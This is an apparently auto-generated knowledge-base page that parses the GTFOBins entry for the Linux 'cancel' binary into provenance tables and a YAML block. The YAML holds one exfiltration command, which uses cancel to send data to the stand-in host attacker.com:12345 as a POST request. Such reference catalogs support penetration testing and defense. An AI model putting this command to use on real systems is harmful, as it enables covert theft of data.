---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# cancel

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `cancel` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/cancel` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [cancel](../../tools/linux/cancel.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | cancel |
| name | cancel |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/cancel/ |

## Preserved Source Material

```yaml
_body: ''
_name: cancel
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/cancel
functions:
  upload:
  - binary: false
    code: cancel -h attacker.com:12345 -u DATA
    comment: Data is sent as a POST request along with other content.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
```
